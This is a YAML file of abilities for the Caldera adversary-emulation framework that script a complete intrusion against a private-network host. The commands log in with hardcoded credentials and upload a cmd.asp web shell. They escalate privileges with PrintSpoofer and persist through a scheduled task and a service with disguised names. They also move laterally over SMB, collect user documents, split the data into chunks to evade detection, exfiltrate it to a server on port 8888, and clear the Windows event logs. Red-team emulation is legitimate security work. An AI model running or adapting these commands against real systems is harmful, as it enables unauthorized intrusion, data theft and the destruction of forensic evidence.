- ability_id: bce5dfd5-f459-5b57-bf7a-0f5737f7daf4
  name: Web Application Login
  description: Authenticate to web application using compromised credentials
  tactic: initial-access
  technique_id: T1133
  technique_name: External Remote Services
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: $body = @{userid='admin'; password='P@ssw0rd!2020'}; $session = New-Object
      Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest -Uri 'http://192.168.56.105/login_process.asp'
      -Method POST -Body $body -WebSession $session -UseBasicParsing
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: efbf0adc-d132-54ee-a10f-e6a46ee78402
  name: Upload Web Shell
  description: Upload cmd.asp web shell through file upload vulnerability
  tactic: initial-access
  technique_id: T1133
  technique_name: External Remote Services
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: '$loginBody = @{userid=''admin''; password=''P@ssw0rd!2020''}; $session
      = New-Object Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest
      -Uri ''http://192.168.56.105/login_process.asp'' -Method POST -Body $loginBody
      -WebSession $session -UseBasicParsing; $boundary = [System.Guid]::NewGuid().ToString();
      $filePath = ''cmd.asp''; $fileContent = Get-Content $filePath -Raw; $bodyLines
      = @("--$boundary", ''Content-Disposition: form-data; name="file"; filename="cmd.asp"'',
      ''Content-Type: application/octet-stream'', '''', $fileContent, "--$boundary--");
      $body = $bodyLines -join "`r`n"; Invoke-WebRequest -Uri ''http://192.168.56.105/upload_handler.asp''
      -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $body
      -WebSession $session -UseBasicParsing'
    timeout: 20
    payloads:
    - cmd.asp
    uploads: []
    cleanup: []
- ability_id: 0c23583b-6b68-526c-a44e-f3ea67e4851c
  name: Verify Web Shell Access
  description: Confirm web shell is accessible and functional
  tactic: initial-access
  technique_id: T1133
  technique_name: External Remote Services
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp' -UseBasicParsing
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: e6c1137b-e69d-5cd4-9800-c3696082a127
  name: Copy PrintSpoofer to Web Directory
  description: Copy PrintSpoofer64.exe to web-accessible directory
  tactic: privilege-escalation
  technique_id: T1100
  technique_name: Web Shell
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe'
      -Force
    timeout: 20
    payloads:
    - PrintSpoofer64.exe
    uploads: []
    cleanup: []
- ability_id: 9f6a427a-6f30-591e-a254-8c1c1fabde62
  name: Copy vcruntime140.dll to Web Directory
  description: Copy required DLL dependency to web-accessible directory
  tactic: privilege-escalation
  technique_id: T1038
  technique_name: DLL Search Order Hijacking
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\inetpub\wwwroot\uploads\vcruntime140.dll'
      -Force
    timeout: 20
    payloads:
    - vcruntime140.dll
    uploads: []
    cleanup: []
- ability_id: 59a0db18-03c2-54e9-a05e-69904c66877d
  name: Copy Deploy Script to Web Directory
  description: Copy deploy.ps1 Caldera agent deployment script to web-accessible directory
  tactic: privilege-escalation
  technique_id: T1100
  technique_name: Web Shell
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Copy-Item -Path 'deploy.ps1' -Destination 'C:\inetpub\wwwroot\uploads\deploy.ps1'
      -Force
    timeout: 20
    payloads:
    - deploy.ps1
    uploads: []
    cleanup: []
- ability_id: acf1ba80-78c9-5100-99e4-ca1fbc70210d
  name: Execute PrintSpoofer Privilege Escalation
  description: Use PrintSpoofer to escalate from IIS service account to SYSTEM and
    deploy Caldera agent
  tactic: privilege-escalation
  technique_id: T1068
  technique_name: Exploitation for Privilege Escalation
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
      -c "powershell.exe -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\uploads\deploy.ps1"'
      -UseBasicParsing
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 881817d9-1151-5a2e-84f7-1187795182b1
  name: Create Scheduled Task for Persistence
  description: Register malware in task scheduler for persistence across reboots
  tactic: persistence
  technique_id: T1053.005
  technique_name: Scheduled Task
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: schtasks /create /tn 'WindowsUpdate' /tr 'powershell.exe -ExecutionPolicy
      Bypass -File C:\Windows\Temp\deploy.ps1' /sc onstart /ru SYSTEM /f
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 70f7612f-f32b-54a2-84e9-a8f1886c2adf
  name: Create Service for Persistence
  description: Register malware as system service for persistence
  tactic: persistence
  technique_id: T1543.003
  technique_name: Windows Service
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: sc.exe create WinDefender binPath= 'C:\Windows\Temp\agent.exe' start=
      auto; sc.exe start WinDefender
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: afe20298-4596-5ee2-9ad3-51fcdf7abd9e
  name: Deploy Keylogger (Simulated)
  description: Simulate keylogger deployment for credential harvesting
  tactic: credential-access
  technique_id: T1056.001
  technique_name: Keylogging
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: echo 'keylogger stub - capturing keystrokes' > C:\Windows\Temp\perfcon.dat;
      Write-Output 'Keylogger installed (simulated)'
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 6be6e030-8fa1-5885-8ef6-86f04ba4da91
  name: Gather System Information
  description: Collect OS version, hostname, and system configuration
  tactic: discovery
  technique_id: T1082
  technique_name: System Information Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: systeminfo > C:\Windows\Temp\sysinfo.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: c439183c-0e51-5f68-8851-cb66b70af735
  name: Identify Current User Context
  description: Determine current user privileges and context
  tactic: discovery
  technique_id: T1497.002
  technique_name: User Activity Based Checks
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: whoami /all > C:\Windows\Temp\whoami.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: b1e7bf60-5129-5c23-97a2-5c492bf9d654
  name: Enumerate Local User Accounts
  description: Discover local user accounts on compromised system
  tactic: discovery
  technique_id: T1087.001
  technique_name: Local Account
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: net user > C:\Windows\Temp\localusers.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 80531fa0-0a21-5e3c-8cc3-dc56e6af357b
  name: Enumerate Domain Accounts
  description: Discover domain user accounts
  tactic: discovery
  technique_id: T1087.002
  technique_name: Domain Account
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: net user /domain > C:\Windows\Temp\domainusers.txt 2>&1
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 759e07eb-66a5-5e84-a1a4-a1111e89690e
  name: Enumerate Running Processes
  description: Identify active processes including security tools
  tactic: discovery
  technique_id: T1007
  technique_name: System Service Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: tasklist /v > C:\Windows\Temp\processes.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 724c5125-bd13-58da-a644-ef3033d677c6
  name: Enumerate System Services
  description: Query running services for exploitation targets
  tactic: discovery
  technique_id: T1497.001
  technique_name: System Checks
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: sc query > C:\Windows\Temp\services.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 5cce4287-674a-55fd-aa7c-d0b2d849ba32
  name: Search Critical System Files
  description: Locate system files and DLLs to assess patch levels
  tactic: discovery
  technique_id: T1033
  technique_name: System Owner/User Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Get-ChildItem -Path 'C:\Windows\System32','C:\Windows\SysWOW64' -Filter
      *.dll -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime
      > C:\Windows\Temp\systemfiles.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: d6ce6ba6-e253-5b24-9ec7-9e8fb31b5009
  name: Enumerate Network Configuration
  description: Map network settings and interfaces
  tactic: discovery
  technique_id: T1016
  technique_name: System Network Configuration Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: ipconfig /all > C:\Windows\Temp\ipconfig.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: a5f0aa81-814a-5d8c-bf6e-d3b2aa9c6199
  name: Enumerate ARP Table
  description: Discover network hosts via ARP cache
  tactic: discovery
  technique_id: T1018
  technique_name: Remote System Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: arp -a > C:\Windows\Temp\arp.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: cec09d07-f7d5-589f-9a09-3b669c7cbde3
  name: Enumerate Routing Table
  description: Map network routing configuration
  tactic: discovery
  technique_id: T1040
  technique_name: Network Sniffing
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: route print > C:\Windows\Temp\route.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: f0e60b6b-170b-5bd3-9ecd-6d560fc7d253
  name: Monitor Active Network Connections
  description: Identify established connections and listening ports
  tactic: discovery
  technique_id: T1049
  technique_name: System Network Connections Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: netstat -ano > C:\Windows\Temp\netstat.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: efef5fa5-119c-58f4-87c9-e07d518720df
  name: Enumerate Active Sessions
  description: Identify logged-in users and active sessions
  tactic: discovery
  technique_id: T1033
  technique_name: System Owner/User Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: qwinsta > C:\Windows\Temp\sessions.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 14d99b4b-79b6-500e-9fa7-cf0a217834b6
  name: Discover Network Shares
  description: Enumerate network shares and remote systems
  tactic: discovery
  technique_id: T1135
  technique_name: Network Share Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: net view > C:\Windows\Temp\netview.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 046c5a48-bf18-5623-8355-ebccd3817420
  name: Enumerate Domain Controllers
  description: Identify domain controllers in network
  tactic: discovery
  technique_id: T1482
  technique_name: Domain Trust Discovery
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: 'nltest /dclist: > C:\Windows\Temp\dclist.txt 2>&1'
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 5675be5d-79a6-513c-902d-465697ab6e82
  name: Test SMB Access to Internal Host
  description: Verify SMB connectivity to internal network target
  tactic: lateral-movement
  technique_id: T1550.001
  technique_name: Application Access Token
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: net use \\192.168.56.106\C$ /user:admin P@ssw0rd!2020
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: bcae3bc5-ef96-529b-8adc-23e7dd470409
  name: Copy Caldera Agent to Internal Host
  description: Deploy Caldera agent to internal system via SMB
  tactic: lateral-movement
  technique_id: T1534
  technique_name: Internal Spearphishing
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Copy-Item -Path 'C:\Windows\Temp\deploy.ps1' -Destination '\\192.168.56.106\C$\Windows\Temp\deploy.ps1'
      -Force
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: f2bdd9a5-8f91-5172-b592-92110a0d4c77
  name: Execute Remote Agent Deployment
  description: Execute Caldera agent on internal host via remote PowerShell
  tactic: lateral-movement
  technique_id: T1021
  technique_name: Remote Services
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: $password = ConvertTo-SecureString 'P@ssw0rd!2020' -AsPlainText -Force;
      $cred = New-Object System.Management.Automation.PSCredential('admin', $password);
      Invoke-Command -ComputerName 192.168.56.106 -Credential $cred -ScriptBlock {powershell.exe
      -ExecutionPolicy Bypass -File C:\Windows\Temp\deploy.ps1}
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: a8ff640d-82e5-5716-b90c-0d6765e32071
  name: Collect IIS Web Logs
  description: Gather web server logs for analysis
  tactic: collection
  technique_id: T1056.003
  technique_name: Web Portal Capture
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: New-Item -Path 'C:\Windows\Temp\exfil\weblogs' -ItemType Directory -Force;
      Copy-Item -Path 'C:\inetpub\logs\LogFiles\*' -Destination 'C:\Windows\Temp\exfil\weblogs'
      -Recurse -Force
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 34aecd20-a9cf-54ac-8975-578c755fe1c6
  name: Collect Corporate Documents
  description: Search and collect sensitive corporate documents
  tactic: collection
  technique_id: T1602
  technique_name: Data from Configuration Repository
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: New-Item -Path 'C:\Windows\Temp\exfil\docs' -ItemType Directory -Force;
      Get-ChildItem -Path 'C:\Users','C:\inetpub\wwwroot' -Include *.docx,*.xlsx,*.pdf
      -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination 'C:\Windows\Temp\exfil\docs'
      -Force
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 66d54434-4377-5453-bee1-3721447ef82e
  name: Capture Active Window Titles (Simulated)
  description: Monitor open application windows through simulated keylogger
  tactic: collection
  technique_id: T1113
  technique_name: Screen Capture
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: New-Item -Path 'C:\Windows\Temp\exfil' -ItemType Directory -Force; Get-Process
      | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object MainWindowTitle,ProcessName
      > C:\Windows\Temp\exfil\windows.txt
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: a304bb3c-c126-5e59-81c5-a72b67697f30
  name: Stage Discovery Results
  description: Consolidate all discovery command outputs for exfiltration
  tactic: collection
  technique_id: T1119
  technique_name: Automated Collection
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: New-Item -Path 'C:\Windows\Temp\exfil\discovery' -ItemType Directory
      -Force; Copy-Item -Path 'C:\Windows\Temp\*.txt' -Destination 'C:\Windows\Temp\exfil\discovery'
      -Force -ErrorAction SilentlyContinue
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: aaf54596-73bb-5caf-a3ae-aaa9864947f0
  name: Compress Collected Data
  description: Compress staged data using PowerShell built-in compression
  tactic: exfiltration
  technique_id: T1002
  technique_name: Data Compressed
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Compress-Archive -Path 'C:\Windows\Temp\exfil\*' -DestinationPath 'C:\Windows\Temp\data.zip'
      -Force
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: ae602ea6-28fb-5d5b-a32b-0d89953bb32b
  name: Split Archive into Chunks
  description: Split compressed data into 90KB chunks to evade detection
  tactic: exfiltration
  technique_id: T1030
  technique_name: Data Transfer Size Limits
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: $file = 'C:\Windows\Temp\data.zip'; $chunkSize = 92160; $buffer = New-Object
      byte[] $chunkSize; $reader = [System.IO.File]::OpenRead($file); $chunkNum =
      0; while (($bytesRead = $reader.Read($buffer, 0, $chunkSize)) -gt 0) { $chunkFile
      = "C:\Windows\Temp\data_chunk_$chunkNum"; [System.IO.File]::WriteAllBytes($chunkFile,
      $buffer[0..($bytesRead-1)]); $chunkNum++ }; $reader.Close()
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 4d06e25a-2ad0-5ee1-91d8-155c7f80808c
  name: Exfiltrate Data to Caldera Server
  description: Upload collected data chunks to Caldera server
  tactic: exfiltration
  technique_id: T1537
  technique_name: Transfer Data to Cloud Account
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Get-ChildItem -Path 'C:\Windows\Temp\data_chunk_*' | ForEach-Object {
      Invoke-RestMethod -Uri 'http://192.168.56.1:8888/file/upload' -Method POST -InFile
      $_.FullName }
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: c223a2b7-0c71-5ff5-b571-2410916ed280
  name: Clear Security Event Logs
  description: Delete security event logs to remove traces of attack
  tactic: defense-evasion
  technique_id: T1070.001
  technique_name: Clear Windows Event Logs
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: wevtutil cl Security
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 4da6623d-f8ed-584e-9d67-871ed5de2d45
  name: Clear System Event Logs
  description: Delete system event logs to remove traces of attack
  tactic: defense-evasion
  technique_id: T1070.001
  technique_name: Clear Windows Event Logs
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: wevtutil cl System
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: 9ffc1020-1fda-5368-a3be-387e8ad69acf
  name: Clear Application Event Logs
  description: Delete application event logs to remove traces of attack
  tactic: defense-evasion
  technique_id: T1070.001
  technique_name: Clear Windows Event Logs
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: wevtutil cl Application
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
- ability_id: a864b78e-6d82-52cb-af27-1f444f22fa03
  name: Delete Uploaded Malware Files
  description: Remove malware files from uploads directory
  tactic: defense-evasion
  technique_id: T1070.010
  technique_name: Relocate Malware
  singleton: true
  executors:
  - name: psh
    platform: windows
    command: Remove-Item -Path 'C:\inetpub\wwwroot\uploads\cmd.asp','C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe','C:\inetpub\wwwroot\uploads\vcruntime140.dll','C:\inetpub\wwwroot\uploads\deploy.ps1'
      -Force -ErrorAction SilentlyContinue
    timeout: 20
    payloads: []
    uploads: []
    cleanup: []
